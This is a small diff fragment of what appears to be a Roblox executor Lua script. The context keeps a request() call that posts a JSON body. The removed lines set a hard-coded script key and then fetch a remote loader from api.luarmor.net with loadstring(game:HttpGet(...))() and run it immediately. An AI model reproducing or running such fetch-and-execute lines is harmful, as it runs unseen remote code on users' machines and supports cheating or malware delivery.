@@ -49,8 +49,3 @@ request({
     Headers = { ["Content-Type"] = "application/json" },
     Body = json
 })
-
-wait(5)
-
-script_key="CdBKgrVTJrXsKqIxIzJzzBUvtBhuMedh";
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b53f756b22b1ec6831177dc2cb824500.lua"))()
